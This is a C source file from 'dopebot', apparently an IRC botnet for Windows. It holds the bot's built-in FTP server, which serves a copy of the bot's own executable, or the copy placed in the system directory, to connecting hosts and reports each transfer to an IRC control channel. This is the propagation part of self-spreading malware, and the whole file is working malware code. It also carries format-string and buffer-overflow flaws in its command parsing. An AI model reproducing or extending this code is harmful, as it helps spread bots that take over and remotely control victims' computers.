/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef NO_FTPD
#include "..\Bot\bot.h"

//FTPD
DWORD WINAPI ftpd(LPVOID param)
{
	BOOL bOptVal = TRUE;
	DWORD dwID;
	ftp ftps1 = *((ftp *)param);
	int bOptLen = sizeof(BOOL), iOptVal, iOptLen = sizeof(int);
	register int i;
	SOCKET sock, consock;
	struct ftp ftps;
	struct sockaddr_in sin;
//	WSADATA wsadata;

#ifndef NO_DEBUG
		printf("[DEBUG] Starting FTPD, ftpd()\n");
#endif

//	if (WSAStartup(MAKEWORD(2,2), &wsadata) != 0) return 0;
		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = 0;
		sin.sin_port = htons(ftps1.iPort);
		i = sizeof(sin);
		sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET) return 0;
		ftps.iPort = ftps1.iPort;
		sprintf(ftps.szUser, ftps1.szUser);
		sprintf(ftps.szPass, ftps1.szPass);
		ftps.bsock = ftps1.bsock;
		sprintf(ftps.szFileName, ftps1.szFileName);
		sprintf(ftps.szAction, ftps1.szAction);
		sprintf(ftps.szChannel, ftps1.szChannel);
		setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char *)&iOptVal, iOptLen);
	if (bind(sock, (struct sockaddr *)&sin, i) == SOCKET_ERROR) return 0;
		listen(sock, 10);
	while (1)
	{
			consock = accept(sock, (struct sockaddr *)&sin, &i);
		if (consock != INVALID_SOCKET)
		{
				ftps.consock = consock;
				CreateThread(0, 0, ftpd_handler, &ftps, 0, &dwID);
		}
			Sleep(500);
	}
		closesocket(consock);
		closesocket(sock);
//		WSACleanup();
		return 0;
}

//FTPD Transfer
bool ftpd_datatransfer(char *szIP, int iPort, char *szFile)
{
	char szBuffer[4];
	FILE *f = 0;
	int i;
	SOCKET sock;
	struct sockaddr_in sin;
//	WSADATA wsadata;

#ifndef NO_DEBUG
		printf("[DEBUG] Starting FTPD Transfer, ftpd_datatransfer()\n");
#endif

//	if (WSAStartup(MAKEWORD(2,2), &wsadata) != 0) return FALSE;
		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = inet_addr(szIP);
		sin.sin_port = htons(iPort);
		sock = socket(AF_INET, SOCK_STREAM, 0);
	if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) != SOCKET_ERROR)
	{
			f = fopen(szFile, "rb");
		if (!f) return FALSE;
		while (!feof(f))
		{
				i = fread(szBuffer, sizeof(char), sizeof(szBuffer), f);
				send(sock, szBuffer, i, 0);
		}
	}
		fclose(f);
		closesocket(sock);
//		WSACleanup();
		return TRUE;
}

//FTPD Handler
DWORD WINAPI ftpd_handler(LPVOID param) 
{
	char szBuffer[IRCBUF], szParam1[32], szParam2[32], szParam3[32], szFilePath[MAX_PATH];
	char h1[4], h2[4], h3[4], h4[4], p1[50], p2[50], tmp[50], ip[16];
	ftp ftps = *((ftp *)param);
	int iRecvd;
	int port;
	SOCKET consock = ftps.consock;

#ifndef NO_DEBUG
		printf("[DEBUG] Starting FTPD handling thread, ftpd_handler()\n");
#endif

		send(consock, "220 dopebot ftpd.\r\n", 19, 0);
	while (1)
	{
			iRecvd = recv(consock, szBuffer, sizeof(szBuffer) - 1, 0);
			szBuffer[iRecvd] = '\0';
			sscanf(szBuffer, "%s %s", szParam1, szParam2);
		if (strcmp(szParam1, "USER") == 0) 
		{
				sprintf(szParam3, szParam2);
				sprintf(szBuffer, "331 Password required for %s.\r\n", szParam2);
				Sleep(500);
				send(consock, szBuffer, strlen(szBuffer), 0);
		}
		else if (strcmp(szParam1, "PASS") == 0) 
		{
			if ((strcmp(szParam2, ftps.szPass) == 0) && (strcmp(szParam3, ftps.szUser) == 0))
			{
					sprintf(szBuffer, "230 User %s logged in.\r\n", szParam2);
					Sleep(500);
					send(consock, szBuffer, strlen(szBuffer), 0);
			}
			else
			{
					send(consock, "530 Login or Password incorrect.\r\n", 34, 0);
				goto end;
			}
		}
		else if ((strcmp(szParam1, "TYPE") == 0) && (strcmp(szParam2, "A") == 0))
				send(consock, "200 TYPE is now ASCII.\r\n", 24, 0);
		else if (strcmp(szParam1, "SYST") == 0)
				send(consock, "215 UNIX Type: L8.\r\n", 20, 0);	
		else if (strcmp(szParam1, "PORT") == 0)
		{
				sscanf(szBuffer, "%*s %[^,],%[^,],%[^,],%[^,],%[^,],%[^\n]", h1, h2, h3, h4, p1, p2);
				sprintf(tmp, "%x%x\n", atoi(p1), atoi(p2));
				port = strtoul(tmp, NULL, 16);
				sprintf(ip, "%s.%s.%s.%s", h1, h2, h3, h4);
				Sleep(500);
				send(consock, "200 PORT command successful.\r\n", 30, 0);				
		}
		else if (strcmp(szParam1, "RETR") == 0)
		{

				GetModuleFileName(GetModuleHandle(NULL), szFilePath, sizeof(szFilePath));

#ifndef NO_FWB
			if (is_fwb())
			{
				char szSysDir[MAX_PATH];
					GetSystemDirectory(szSysDir, sizeof(szSysDir));
					sprintf(szFilePath, "%s\\%s", szSysDir, ftps.szFileName);
			}
#endif

				PathStripPath(szFilePath);	
			if (strcmp(szParam2, szFilePath) == 0)
			{
					send(consock,"150 Opening BINARY mode data connection.\r\n",42 , 0);
					GetModuleFileName(GetModuleHandle(NULL), szFilePath, sizeof(szFilePath));

#ifndef NO_FWB					
			if (is_fwb())
			{
				char szSysDir[MAX_PATH];
					GetSystemDirectory(szSysDir, sizeof(szSysDir));
					sprintf(szFilePath, "%s\\%s", szSysDir, ftps.szFileName);
			}
#endif

					sprintf(szBuffer, "[FTP] File Transfer Started To: %s (%s).", ip, szFilePath);
					irc_msg(ftps.bsock, ftps.szAction, ftps.szChannel, szBuffer);
				if (ftpd_datatransfer(ip, port, szFilePath))
				{
						send(consock,"226 Transfer ok.\r\n", 18 , 0);
						sprintf(szBuffer, "[FTP] File Transfer Finished To: %s (%s).", ip, szFilePath);
						irc_msg(ftps.bsock, ftps.szAction, ftps.szChannel, szBuffer);
					goto end;
				}
				else
				{
						send(consock,"425 Can't open data connection.\r\n", 33, 0);
						sprintf(szBuffer, "[FTP] File Transfer Failed To: %s (%s).", ip, szFilePath);
						irc_msg(ftps.bsock, ftps.szAction, ftps.szChannel, szBuffer);
					goto end;
				}
			}
			else
			{
					sprintf(szBuffer, "550  '%s' : No Such File.\r\n", szParam2);
					Sleep(500);
					send(consock, szBuffer, strlen(szBuffer), 0);
					sprintf(szBuffer, "[FTP] File Transfer Failed To: %s (%s)!", ip, szFilePath);
					irc_msg(ftps.bsock, ftps.szAction, ftps.szChannel, szBuffer);
				goto end;
			}
		}
		else if (strcmp(szParam1, "STOR") == 0)
			send(consock, "500 Command Not Supported.\r\n", 28, 0);
		else if (strcmp(szParam1, "QUIT") == 0)
		{
				send(consock,"221 Bye bye ...\r\n", 17 , 0);
			goto end;
		}
		else if (szParam1 != NULL) goto end;
	}
end:
		closesocket(consock);
		return 0;
}
#endif